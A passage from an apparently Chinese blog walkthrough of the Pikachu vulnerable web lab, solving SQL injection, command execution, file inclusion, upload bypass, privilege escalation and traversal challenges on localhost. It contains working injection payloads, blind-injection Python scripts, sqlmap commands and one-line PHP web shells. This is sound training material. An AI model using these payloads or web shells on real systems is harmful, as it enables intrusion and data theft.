<p>现在开始查他的内容<code>1%20union%20select%201%2C(select%20(group_concat(username%2Cpassword)))%20from%20users%20limit%201%2C1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171908967.png" alt="image-20221117190846851"></p>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>加了个单引号而已,通过＃注释,继续上一题的payload这里不再浪费时间</p>
<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>看见搜索框我们先来试一下xss<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171951801.png" alt="image-20221117195126764"></p>
<p>然后就拿到了sql语句后边是<code>%&#39;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>源码也确实如此,还是老套路继续打<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172014731.png" alt="image-20221117201425689"></p>
<h4 id="xxx型注入"><a href="#xxx型注入" class="headerlink" title="xxx型注入"></a>xxx型注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;</span><br></pre></td></tr></table></figure>

<p>只是换了种闭合方式,换汤不换药</p>
<h4 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172036791.png" alt="image-20221117203610725"></p>
<p>登陆界面是无法注入,我们注册登录一下,这里的报错注入是可以用的<code>&#39; or updatexml(1, concat(0x7e, database()), 0)#</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172115281.png" alt="image-20221117211543250"></p>
<p>详情可参考<a href="https://charmersix.icu/2022/10/01/web_5/">这篇</a>,这里不再重复</p>
<h4 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h4><p>这里删除发现没什么用,抓包一看原来注入点在这</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172121666.png" alt="image-20221117212128603"></p>
<p>拿下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172122266.png" alt="image-20221117212259213"></p>
<h4 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172127264.png" alt="image-20221117212727228"></p>
<p>跟上边insert注入一样,就是换了换地方payload:<code> &#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211172134774.png" alt="image-20221117213413700"></p>
<h4 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h4><p>首先用<code>kobe&#39; and length(database())&gt;10 #</code>判断出数据库名的长度</p>
<p>经过几次尝试我们可以拿到数据库长度为7</p>
<p>然后我们来个py脚本注一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        data = <span class="string">&quot;kobe&#x27;%20and%20if(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2C1%2C(select%20table_name%20from%20information_schema.tables))%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>.<span class="built_in">format</span>(i,u)</span><br><span class="line">        <span class="comment"># data=&#123;</span></span><br><span class="line">        <span class="comment"># &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        response = requests.get(url=url+data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;your uid:3&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据库名:&quot;</span>+user)</span><br></pre></td></tr></table></figure>

<p>也可以用bp爆破,抓包,然后发到intruder,然后打上我们的payload,设一下这两个位置<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182130146.png" alt="image-20221118213032092"></p>
<p>然后两个位置分别是数字和字母<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182131299.png"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182132186.png" alt="image-20221118213208134"></p>
<p>这里的1-7就刚好是我们数据库的库名顺序</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211182118528.png" alt="image-20221118211833411"></p>
<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>同bool盲注,我们先判断数据库长度<code>kobe&#39; and if (length(database()) &gt; 5 ,sleep(5),null) #</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">&quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        prox= &#123;</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = <span class="string">&quot;kobe&#x27;%20and%20if%20(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2Csleep(5)%2Cnull)%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>.<span class="built_in">format</span>(i,u)</span><br><span class="line">        <span class="comment"># data=&#123;</span></span><br><span class="line">        <span class="comment"># &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),</span></span><br><span class="line">        <span class="comment"># &#125;</span></span><br><span class="line">        <span class="comment"># if &quot;your uid:3&quot; in response.text:</span></span><br><span class="line">        <span class="comment">#     user += u</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line"></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url=url + data,proxies=prox)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        t = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> t &gt; <span class="number">5</span>:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i)+<span class="built_in">format</span>(u))    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数据库名:&quot;</span>+user)</span><br></pre></td></tr></table></figure>

<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><blockquote>
<p>宽字节注入指的是MySQL数据库在使用宽字节(GBK)编码时,会认为两个字符是一个汉字(前一个ASCII码要大于128(比如%df),才到汉字的范围),而当我们输入单引号时,MySQL会调用转义函数,将单引号变为<code>\&#39;</code>,其中的<code>\</code>的十六进制是<code>%5c</code>,MySQL的GBK编码,会认为<code>%df%5c</code>是一个宽字节,也就是<code>運</code>从而使单引号闭合,进行注入.</p>
<p>宽字节注入发生的位置就是php发送请求到MySQL时字符使用<code>character_set_client</code>设置值进行了一次编码,然后服务器会根据<code>character_set_connenction</code>把请求进行转码,从<code>character_set_client</code>转成<code>character_set_connection</code>,然后更新到数据库的时候,再转化成字段所对应的编码</p>
</blockquote>
<p>下述数据变化过程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="built_in">df</span>%27===&gt;(addslashes)====&gt;%<span class="built_in">df</span>%5c%27====&gt;(GBK)====&gt;運’</span></span><br><span class="line"></span><br><span class="line">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<p>payload:<code>name=kobe%20%df&#39;%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1#&amp;submit=%E6%9F%A5%E8%AF%A2</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211192156018.png" alt="image-20221119215647942"></p>
<h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>我们再用sqlmap来一遍这个题目</p>
<h4 id="数字型注入-1"><a href="#数字型注入-1" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>这题是post型,我们先抓一个post的包</p>
<blockquote>
<p>POST /vul/sqli/sqli_id.php HTTP/1.1<br>Host: localhost<br>Content-Length: 29<br>Cache-Control: max-age=0<br>sec-ch-ua: “Chromium”;v=”95”, “;Not A Brand”;v=”99”<br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: “Windows”<br>Upgrade-Insecure-Requests: 1<br>Origin: <a href="http://localhost/">http://localhost</a><br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: <a href="http://localhost/vul/sqli/sqli_id.php">http://localhost/vul/sqli/sqli_id.php</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=70en5hdmaav0gib3anlocf62h7<br>Connection: close</p>
<p>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</p>
</blockquote>
<p><code>python .\sqlmap.py -r 1.txt -p id --dbs --batch</code></p>
<h4 id="字符型注入-1"><a href="#字符型注入-1" class="headerlink" title="字符型注入"></a>字符型注入</h4><p> <code> python .\sqlmap.py -u http://localhost/vul/sqli/sqli_str.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch</code></p>
<h4 id="搜索型注入-1"><a href="#搜索型注入-1" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p><code>python .\sqlmap.py -u http://localhost/vul/sqli/sqli_search.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch</code></p>
<h4 id="xxx型注入-1"><a href="#xxx型注入-1" class="headerlink" title="xxx型注入"></a>xxx型注入</h4><p>同上,仍然可以打出</p>
<p><code> python .\sqlmap.py -u http://localhost/vul/sqli/sqli_x.php?name=1&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs --batch</code></p>
<h4 id="“insert-update”注入-1"><a href="#“insert-update”注入-1" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><p><code> python .\sqlmap.py -r 1.txt -p add --dbs --batch</code></p>
<h4 id="“delete”注入-1"><a href="#“delete”注入-1" class="headerlink" title="“delete”注入"></a>“delete”注入</h4><p>继续上述payload即可</p>
<h4 id="http头注入-1"><a href="#http头注入-1" class="headerlink" title="http头注入"></a>http头注入</h4><p><code>sqlmap --level</code> 有五个等级,默认为1,2是cookie注入,3是UA注入,4是refere注入,5是host注入,这里我们使用level3</p>
<p><code>python .\sqlmap.py -r 1.txt -p User-Agent --level 3 --batch --dbs</code></p>
<h4 id="基于boolian的盲注-1"><a href="#基于boolian的盲注-1" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h4><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><blockquote>
<p>RCE(remote command/code execute)概述</p>
<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
<p><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p>
<p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-</p>
<p><strong>远程代码执行</strong><br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p>
<p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
<p>你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h4><p>这里应该是后端执行了shell ping命令,所以我们可以试一下<code>|</code>和`&amp;</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211200002146.png" alt="image-20221120000257034"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211200003805.png" alt="image-20221120000301710"></p>
<p>都可以执行成功就直接相当于拿到了服务器shell</p>
<h4 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201613350.png" alt="image-20221120161324190"></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><blockquote>
<p>File Inclusion(文件包含漏洞)概述</p>
<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>
<p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
<p>你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>我们在目录下新建个txt,一会通过web页面读它<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201629180.png" alt="image-20221120162939127"></p>
<p>然后我们直接在url里输入目录就可以<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201631389.png" alt="image-20221120163110337"></p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>这题没有把include写入源码里,需要我们在url里加上,当然也就给了我们一个远程利用的机会<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201641089.png" alt="image-20221120164145034"></p>
<p>我们在远程服务器写一个可以写文件的php语句,然后写上一句话木马,像这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php system($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201725347.png" alt="image-20221120172546281"></p>
<p>pikachu成功被我们上传一句话木马</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211201737606.png" alt="image-20221120173709513"></p>
<p>上述方法很明显是非常繁杂的,那有没有什么简单粗暴的方法呢,当然有,上边<code>1.txt</code>是可以执行的,那我们把<code>1.txt</code>直接写成一句话木马不久可以了吗</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211242049874.png"></p>
<h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><blockquote>
<p>不安全的文件下载概述</p>
<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p>
<p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p>
<p>你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="不安全的文件下载-1"><a href="#不安全的文件下载-1" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h4><p>这里可以类比于文件包含,我们可以下载到自己想要的任何虚拟机文件,这里我采用两种方法第一种是bp抓包改包<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202011354.png" alt="image-20221120201053242"></p>
<p>第二种直接F12修改一下下载路径<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202011229.png" alt="image-20221120201134143"></p>
<h3 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h3><blockquote>
<p>不安全的文件上传漏洞概述</p>
<p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p>
<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
<p>你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h4><p>这里可以简单理解成前端验证,然后JavaScript跳出来组织你上传,那我们只要把JavaScript禁用了就不会有任何东西阻止我们传马了,这里我在chrome store随便下载了<a href="https://chrome.google.com/webstore/detail/quick-javascript-switcher/geddoclleiomckbhadiaipdggiiccfje?hl=zh-CN">一个</a></p>
<p>然后就可以传上php一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202114064.png" alt="image-20221120211443956"></p>
<p>蚁剑就可以连接了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202117824.png" alt="image-20221120211738760"></p>
<h4 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h4><p>这里只是验证了<code>Content-Type</code>我们抓包改包就可以拿下还是利用上题的一句话木马就可以解决</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$type</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);<span class="comment">//指定类型</span></span><br><span class="line"><span class="variable">$mime</span>=<span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line"><span class="variable">$save_path</span>=<span class="string">&#x27;uploads&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;/Y/m/d/&#x27;</span>);<span class="comment">//根据当天日期生成一个文件夹</span></span><br><span class="line"><span class="variable">$upload</span>=<span class="title function_ invoke__">upload</span>(<span class="string">&#x27;uploadfile&#x27;</span>,<span class="string">&#x27;512000&#x27;</span>,<span class="variable">$type</span>,<span class="variable">$mime</span>,<span class="variable">$save_path</span>);<span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure>

<p>这题会检查图片的特征,所以我们直接在一张图片里隐写一个一句话木马像这样</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202323504.png" alt="image-20221120232350409"></p>
<p>我们上传这张图片,发现可以上传成功,并且图片里有一句话木马,但是我们这样读取是以图片的形式读取,我们的一句话木马是没法执行的这时候有个比较巧妙的办法就是利用前边的文件包含去读取我们现在文件上传的目录<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202327353.png" alt="image-20221120232738284"></p>
<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><blockquote>
<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
<p>你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>这里我们先登录lucy的账号看一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271902953.png" alt="image-20221227190200821"></p>
<p>这里我们直接将url地址改成kobe试一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271904497.png" alt="image-20221227190421428"></p>
<p>显然, 我们成功访问到了kobe的所有信息</p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>我们先登录admin看一下, 可以发现admin是可以添加用户的<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271914258.png" alt="image-20221227191441192"></p>
<p>那我们用pikachu用户试一下能不能添加用户呢?</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271936671.png"></p>
<p>创建成功!</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271929329.png" alt="image-20221227192907295"></p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote>
<p>目录遍历漏洞概述</p>
<p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
<p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
<p>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。</p>
</blockquote>
<p>任意文件读取,直接相对路径读到<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271945093.png" alt="image-20221227194559038"></p>
<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><blockquote>
<p>敏感信息泄露概述</p>
<p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
<p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p>
</blockquote>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272021878.png" alt="image-20221227200726520"></p>
<p>直接相对目录读一下</p>
<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><blockquote>
<p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p>
<p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p>
